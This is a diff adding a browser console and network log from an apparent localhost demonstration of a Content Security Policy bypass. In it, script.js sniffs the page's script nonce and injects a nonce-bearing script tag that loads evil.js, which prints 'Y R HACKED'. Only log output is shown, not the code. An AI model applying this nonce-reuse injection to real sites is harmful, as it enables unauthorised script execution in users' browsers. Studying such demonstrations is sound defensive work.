@@ -1,0 +1,24 @@
+GEThttp://localhost:8080/
+[HTTP/1.1 200 OK 1ms]
+
+GEThttp://localhost:8080/js/script.js
+GEThttp://localhost:8080/css/style.css
+[HTTP/1.1 200 OK 1ms]
+
+GEThttp://localhost:8080/js/script.js
+[HTTP/1.1 200 OK 2ms]
+
+GEThttp://localhost:8080/favicon.ico
+[HTTP/1.1 404 Not Found 0ms]
+
+Start hack script.js:3:13
+Sniff script nonce script.js:4:13
+Sniffed nonce: 373ede24c8ba7c0808a979bfd8656823c62d72acebc2d5d18ef19862aedbf272 script.js:7:13
+Create script element that contain the sniffed nonce and insert it on html script.js:12:13
+<script src="/js/evil.js" type="text/javascript" nonce="373ede24c8ba7c0808a979bf…bc2d5d18ef19862aedbf272">
+script.js:20:13
+GEThttp://localhost:8080/js/evil.js
+[HTTP/1.1 200 OK 2ms]
+
+Into evil file!!! evil.js:3:9
+Y R HACKED evil.js:4:9
